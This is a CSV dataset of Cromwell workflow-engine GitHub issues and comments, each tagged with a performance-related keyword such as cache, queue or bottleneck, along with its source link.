Performance,Many small metadata writes causes bottleneck in DB,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810:34,bottleneck,bottleneck,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810,1,['bottleneck'],['bottleneck']
Performance,Many tools have thread/cores as parameter. It does not influence the end results but its change in inputs may be considered as cache invalidation by cromwell. It would be nice to have a way to tell cromwell to ignore some variables (like threads) in the caching process.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927:127,cache,cache,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927,1,['cache'],['cache']
Performance,Max workflow concurrency limit takes into account sub-workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4066:13,concurren,concurrency,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4066,1,['concurren'],['concurrency']
Performance,Merging with caveats:; - sbt tests are passing; - aws centaur is using an old queue; - other centaurs are failing due to expected and excessive logging. None of this is expected to negatively affect production,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957:78,queue,queue,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5982#issuecomment-718140957,1,['queue'],['queue']
Performance,Metadata backwards compatible and more performant Closes #936,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/981:39,perform,performant,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/981,1,['perform'],['performant']
Performance,Metadata sawtooth in throughput / queue,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4400:21,throughput,throughput,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4400,2,"['queue', 'throughput']","['queue', 'throughput']"
Performance,Metadata service workflow existence cache. Closes #962,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/965:36,cache,cache,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/965,1,['cache'],['cache']
Performance,MetadataService.wdlValueToMetadataEvents enormous bottleneck for large outputs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1776:50,bottleneck,bottleneck,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1776,1,['bottleneck'],['bottleneck']
Performance,Migration to load balanced cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3353:13,load,load,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3353,1,['load'],['load']
Performance,Minor change in order to support different implementations of KV stores.; I think with this minor change we will be able to use different dbs for this service and not just SQL.; Our business requires to use Doc dbs so that why I'm proposing this change.; Later in the future we can discuss if it's worthy to define a DAL. FYI... I tried to perform minimal changes to what is there...,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254:340,perform,perform,340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254,1,['perform'],['perform']
Performance,Modify Cromwell so as to play nicely in a load balanced environment where the individual Cromwell instances are sharing the same database,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3339:42,load,load,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3339,1,['load'],['load']
Performance,"More details about recreating the error here: https://gatkforums.broadinstitute.org/firecloud/discussion/10740/error-the-local-copy-message-must-have-path-set. Essentially, if a task looks like ; ```; task t {; 	File x = """"; 	; 	command {; ...; 	}; 	runtime {; ...; 	}; }; ```; The job fails with: ; ```; BackendJobDescriptorKey_CommandCallNode_w.t:-1:1/CCHashingJobActor-b12fef61-w.t:NA:1] Failed to hash ; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: Either exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: Google Cloud Storage. Failures: Google Cloud Storage: does not have a gcs scheme (IllegalArgumentException) Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:64); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:58); 	at cromwell.core.path.PathFactory.buildPath(PathFactory.scala:30); ```. AC: ; 1. In case that a user has set the value of a required File as an empty string --this error message should instead accommodate for this special case and point out that an empty string isn't valid input for a File object. ; 1b. If easy, it would also be nice to remove the link to the HPC config docs and the rest of the info about supported filesystems. ; [Optional] 2. If this doesn't hurt performance somehow, it would be nice if the error message also included the name of the input that failed to hash, not just the name of the call/value of the file.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4158:1581,perform,performance,1581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4158,1,['perform'],['performance']
Performance,"More info on this--there is no region in the cromwell config file, and us-west-2 is specified in ~/.aws/config. Also us-east does not occur in any of the WDLs or json files. So I believe cromwell is _supposed_ to use whatever's set in ~/.aws/config. . Here's an example of where the metadata says the region is us-east-1:. ```; ""runtimeAttributes"": {; ""failOnStderr"": ""false"",; ""queueArn"": ""arn:aws:batch:us-west-2:xxx:job-queue/cromwell-1999"",; ""disks"": ""local-disk /cromwell_root"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""quay.io/fhcrc-microbiome/picard:2.20.1"",; ""maxRetries"": ""1"",; ""cpu"": ""4"",; ""cpuMin"": ""1"",; ""noAddress"": ""false"",; ""zones"": ""us-east-1a"",; ""memoryMin"": ""2 GB"",; ""memory"": ""4 GB""; },; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146:379,queue,queueArn,379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-492893146,2,['queue'],"['queue', 'queueArn']"
Performance,"More people are using the JG server to launch multiple workflows w/ jobs on the order of 10k and it's being slow to start those jobs. There's definitely something going on w/ memory still but one explanation is also that jobs are being queued and throttled in Cromwell to respect quota for submission which is good, but if we have tens of thousands it might take some time to start them. Jose submitted a 40k jobs workflow and aborted it almost immediately and it got me thinking that *if* they were in that queue they would still be submitted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648:236,queue,queued,236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2750#issuecomment-336873648,3,"['queue', 'throttle']","['queue', 'queued', 'throttled']"
Performance,"More precisely, come up with a mechanism that ; 1) Gets all ""workflow-related"" actors to stop doing more work and make sure all DB write operations have been sent to ensure consistency.; 2) Waits for all DB write actors to empty their queue; 3) Shuts down the JVM",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2373#issuecomment-316154937:235,queue,queue,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2373#issuecomment-316154937,1,['queue'],['queue']
Performance,Move performance script out of perf instance startup script,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4844:5,perform,performance,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4844,1,['perform'],['performance']
Performance,Move use cached call Closes #486,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/556:9,cache,cached,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/556,1,['cache'],['cached']
Performance,Move where the kamon stuff is started to fix a race condition,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/624:47,race condition,race condition,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/624,1,['race condition'],['race condition']
Performance,"Much better performance, 8-fold improvement. <img width=""1253"" alt=""Screen Shot 2019-07-31 at 5 15 50 PM"" src=""https://user-images.githubusercontent.com/50877414/62248953-5a7c6680-b3b7-11e9-9b28-393c8a9202a8.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5093#issuecomment-517025325:12,perform,performance,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5093#issuecomment-517025325,1,['perform'],['performance']
Performance,"My ""test"" right now is the following code in a Scala worksheet:; ```; import scala.concurrent.{ExecutionContext, Future}. implicit val ec = ExecutionContext.global. val x = Future(throw new Exception(""hello world"")). val y = x.map(_ => println(""wasd""))(ec); .recover { case a: Throwable => println(""Exception was: "" + a.getMessage) }(ec); ```; which prints; ```; Exception was: hello world; ```; I'm working on figuring out how construct this in situ in a way that meaningfully tests something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862:83,concurren,concurrent,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5022#issuecomment-501411862,1,['concurren'],['concurrent']
Performance,"My jobs aren't starting because there's a giant queue of jobs that have been cancelled, but are waiting to start before they can be aborted. This shouldn't happen. If a job is aborted before it can be launched it shouldn't take a long time to process it. . I heard this might be fixed in 30 already, but if it's not, it would be great to have it fixed.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2966:48,queue,queue,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2966,1,['queue'],['queue']
Performance,"NA20320.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi; 1608597513691,download: s3://focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed to focal-sv-resources/broad-references/v0/sv-resources/resources/v1/hg38_primary_contigs.bed; 1608597515955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz.tbi; 1608597517316,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-41/cacheCopy/SR00c.HG01880.txt.gz.tbi; 1608597520303,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:160191,cache,cacheCopy,160191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"NE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:1890,cache,cache,1890,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,NIO parameter_meta flag for localization optimization,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3738:41,optimiz,optimization,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3738,1,['optimiz'],['optimization']
Performance,"Need to ensure CromIAM can perform at FC/Saturn production scale. @ndbolliger is writing a doc, let's coordinate this effort.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4265:27,perform,perform,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4265,1,['perform'],['perform']
Performance,"New theory: I believe this is seen just before every ""deadlock"" failure. ```java; Exception in thread ""db-2"" java.lang.IllegalArgumentException: requirement failed: count cannot be increased; at scala.Predef$.require(Predef.scala:277); at slick.util.ManagedArrayBlockingQueue.$anonfun$increaseInUseCount$1(ManagedArrayBlockingQueue.scala:43); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at slick.util.ManagedArrayBlockingQueue.locked(ManagedArrayBlockingQueue.scala:201); at slick.util.ManagedArrayBlockingQueue.increaseInUseCount(ManagedArrayBlockingQueue.scala:42); at slick.util.AsyncExecutor$$anon$2$$anon$1.beforeExecute(AsyncExecutor.scala:117); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1146); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-439187592:696,concurren,concurrent,696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-439187592,2,['concurren'],['concurrent']
Performance,"No. The feature is due to a script that monitors disk storage and mounts; new disks into a btrfs filesystem. This isn’t standard for ECS. On Tue, Jul 21, 2020 at 4:08 PM Richard Davison <notifications@github.com>; wrote:. > @markjschreiber <https://github.com/markjschreiber>; >; > The EC2 workers contain a script that automatically expands that mount; > users don't need to set that up. No custom AMI is required, in theory any; > AMI that can work with ECS could be used.; >; > Is this a new feature of all new ECS Optimized Amazon Linux instances?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662080007>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EM4MI3WWXI2AFZAK2LR4XYUHANCNFSM4LW5UP3A>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662153993:518,Optimiz,Optimized,518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662153993,1,['Optimiz'],['Optimized']
Performance,"Not critical but just very annoying as we have to set read and write from; cache to false to use the script. On Wed, Oct 31, 2018 at 8:24 AM Thib <notifications@github.com> wrote:. > Thanks for bringing this up. How critical is this bug for your usage ?; > Chances are we're not going to have the bandwidth to fix it in the near; > future unless it's really blocking a critical use case.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434667203>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/Ao_T2CWzUKe-JlOs5tmFY-0-f-KJR3-4ks5uqZZkgaJpZM4X_RGI>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434703401:75,cache,cache,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4330#issuecomment-434703401,1,['cache'],['cache']
Performance,"Not it isn't, I believe @mcovarr is working on something that should make this ""go away"". ; In the meantime you can try to increase `database.db.queueSize` in the configuration. Results are not guaranteed though it's just giving slick more room but it might still fail. The default is 1000.; Also how big is your workflow ? Must be large to hit this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093:145,queue,queueSize,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2219#issuecomment-298055093,1,['queue'],['queueSize']
Performance,"Not quite similar to #4001 and #3998, but also related to a call-cached-and-retried-centaur-test. In this case the workflow succeeds, producing a metadata key that should _not_ be written. The test is retried, the workflow call-caches, and then copies the same metadata key over, failing again. Example log: [retried_found_unwanted_keys_in_metadata.txt](https://github.com/broadinstitute/cromwell/files/2295492/retried_found_unwanted_keys_in_metadata.txt)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4014:65,cache,cached-and-retried-centaur-test,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4014,2,['cache'],"['cached-and-retried-centaur-test', 'caches']"
Performance,"Not super urgent, but yes I agree. Ideally we would have access to each of the hashes that get hash cached so we could compare them later to see if things changed (i.e. file hashes, other input hashes, docker image hashes, etc)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537:100,cache,cached,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537,1,['cache'],['cached']
Performance,"Not sure if ""scatter"" is the right summary word here but:. Chris Whelan ran a job that sharded 60 different ways, each with 555 samples. . Cromwell was bottlenecked trying to hash all these, and ultimately many of the has requests timed out. It's potentially a spurious correlation, but CPU was pegged at 100% during this time.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3706:152,bottleneck,bottlenecked,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3706,1,['bottleneck'],['bottlenecked']
Performance,Note from [an earlier PR](https://github.com/broadinstitute/cromwell/pull/3350#discussion_r172275966): File literals can happen on input or output. There may be room for optimization if a file has already loaded contents we may not need to reload it twice. Follow the wiring/specs/conformance-tests and see if this makes sense.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3359#issuecomment-370636226:170,optimiz,optimization,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3359#issuecomment-370636226,2,"['load', 'optimiz']","['loaded', 'optimization']"
Performance,"Note that there is already `debug` level logging for the actual flush events, which might be a good idea to turn on to see if the settings we've chosen are reasonable or whether we're just flushing constantly and blowing up the Slick queue.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2543:234,queue,queue,234,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2543,1,['queue'],['queue']
Performance,"Note this is based on the JES restarts branch; that will need to get merged first and I have to make sure that's still okay after all the rebasing I've done there. I was able to run about 70 concurrent Hello Worlds on JES without any Cromwell issues, though I did see some oddities I suspect could be JES issues: lots of Running -> Initializing transitions, and some nearly 30 minute turnaround times for Hello World.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/264:191,concurren,concurrent,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/264,1,['concurren'],['concurrent']
Performance,Note: This PR breaks the cromwell-as-a-git-submodle functionality. But I've got verbal confirmation from @hjfbynara that Green is no longer using cromwell this way. This is the error that one sees with the `sbt-git` used in this PR plus a git submodule:. ```java; fatal: Invalid gitfile format: /Users/kshakir/src/cromwell/.git; [error] java.util.NoSuchElementException: head of empty stream; [error] 	at scala.collection.immutable.Stream$Empty$.head(Stream.scala:1104); [error] 	at scala.collection.immutable.Stream$Empty$.head(Stream.scala:1102); [error] 	at com.typesafe.sbt.SbtGit$.$anonfun$buildSettings$21(SbtGit.scala:138); [error] 	at sbt.internal.util.Init$Value.$anonfun$apply$3(Settings.scala:804); [error] 	at sbt.internal.util.EvaluateSettings.$anonfun$constant$1(INode.scala:197); [error] 	at sbt.internal.util.EvaluateSettings$MixedNode.evaluate0(INode.scala:214); [error] 	at sbt.internal.util.EvaluateSettings$INode.evaluate(INode.scala:159); [error] 	at sbt.internal.util.EvaluateSettings.$anonfun$submitEvaluate$1(INode.scala:82); [error] 	at sbt.internal.util.EvaluateSettings.sbt$internal$util$EvaluateSettings$$run0(INode.scala:93); [error] 	at sbt.internal.util.EvaluateSettings$$anon$3.run(INode.scala:89); [error] 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); [error] 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); [error] 	at java.lang.Thread.run(Thread.java:745); [error] java.util.NoSuchElementException: head of empty stream; ```. cc https://github.com/broadinstitute/cromwell/issues/644,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2785#issuecomment-339382680:1253,concurren,concurrent,1253,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2785#issuecomment-339382680,2,['concurren'],['concurrent']
Performance,"Note: Treat this as a draft/early look/WIP rather than a request to merge immediately. I forgot to push the ""draft"" button. A bunch of bash scripts to be run by Jenkins and executed on VMs in order to get overnight centaur testing of our performance scripts. * Lets the overnight perf tests work again; * Splits the logic into stages so that we aren't doing everything on a single VM (unblocking the transition to horicromtal); * See https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-perf-composite-deploy-and-centaur and the sub-jobs which it calls (especially https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-perf-run-centaur), which make use of these scripts.; * See https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-perf-composite-all-centaur-tests for a jenkins job which runs *all* of our centaur tests against ad-hoc perf Cromwells. TODOs:; - [ ] Document these changes in the google doc; - [ ] Better error reporting(?); - [x] Compile into a suite in jenkins(?)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5075:238,perform,performance,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5075,1,['perform'],['performance']
Performance,"Note: in terms of actually improving performance, the answer will likely be Akka/thread pool type things that were discussed in #ftfy before break",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456953574:37,perform,performance,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-456953574,1,['perform'],['performance']
Performance,Note: this is a tactical fix to allow the cache-fetch post-processing to fail and the workflow to continue.; It does nothing to prevent the errors from happening in the first place - for that issue see #3979,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3978:42,cache,cache-fetch,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3978,1,['cache'],['cache-fetch']
Performance,"Note:. There exists an optional namespace cache in the WDL draft-2 version of `validateNamespace`. WaaS uses only `getWomBundle` and `createExecutable`, so it currently has no interaction with the cache for any language version.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241:42,cache,cache,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458589241,2,['cache'],['cache']
Performance,"Noticed that cached-copy localization strategy is broken in Cromwell-51. This test works on a cluster where `execution-dir` is some place to do execution and copy the inputs to, and `/different/file/system/` is on a different disk. Small task (`catsmallfile.wdl`):. ```wdl; version development. task CatSmallFile {; input {; File inp; }; command {; cat ${inp}; }; output {; String out = read_string(stdout()); }; }; ```. Config (`cromwell.conf`):; ```hocon; include required(classpath(""application"")). backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""<execution-dir>"",; ""filesystems.local.duplication-strategy"": [; ""cached-copy""; ]; }; }; }; }; ```. Command:. ```bash; echo ""Goodbye, call-caching"" >> /different/file/system/inp.txt; echo '{""inp"": ""/different/file/system/inp.txt""}' >> inputs.json. java -Dconfig.file=cromwell.conf -jar cromwell-50.jar run catsmallfile.wdl -i inputs.json; # <execution-dir>/cached-inputs/ is empty. java -Dconfig.file=cromwell.conf -jar cromwell-50.jar run catsmallfile.wdl -i inputs.json; # <execution-dir>/cached-inputs/ is populated; ```. ----. Anecdotally, I've noticed some of the permissions of localised files have changed, I wonder if this is related to that?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533:13,cache,cached-copy,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533,4,['cache'],"['cached-copy', 'cached-inputs']"
Performance,"Now that we've updated our WDLs to 1.0, we've found that `womtool graph` no longer works. It looks like it only supports draft2 and earlier WDL. `test.wdl`:; ```; version 1.0. workflow Test { }; ```. ```; $ java -jar womtool-35.jar graph /tmp/test.wdl ; Exception in thread ""main"" wdl.draft2.parser.WdlParser$SyntaxError: ERROR: Finished parsing without consuming all tokens. version 1.0; ^; ; 	at wdl.draft2.parser.WdlParser.parse(WdlParser.java:2330); 	at wdl.draft2.parser.WdlParser.parse(WdlParser.java:2335); 	at wdl.draft2.model.AstTools$.getAst(AstTools.scala:266); 	at wdl.draft2.model.WdlNamespace$.$anonfun$load$1(WdlNamespace.scala:160); 	at scala.util.Try$.apply(Try.scala:209); 	at wdl.draft2.model.WdlNamespace$.load(WdlNamespace.scala:160); 	at wdl.draft2.model.WdlNamespace$.loadUsingSource(WdlNamespace.scala:156); 	at wdl.draft2.model.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:571); 	at womtool.graph.GraphPrint$.generateWorkflowDigraph(GraphPrint.scala:19); 	at womtool.WomtoolMain$.graph(WomtoolMain.scala:94); 	at womtool.WomtoolMain$.dispatchCommand(WomtoolMain.scala:48); 	at womtool.WomtoolMain$.runWomtool(WomtoolMain.scala:125); 	at womtool.WomtoolMain$.delayedEndpoint$womtool$WomtoolMain$1(WomtoolMain.scala:130); 	at womtool.WomtoolMain$delayedInit$body.apply(WomtoolMain.scala:18); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at womtool.WomtoolMain$.main(WomtoolMain.scala:18); 	at womtool.WomtoolMain.main(WomtoolMain.scala); ```; ; The `womgraph` command still works, but the output from that command is so verbose it's unusable for viewing our 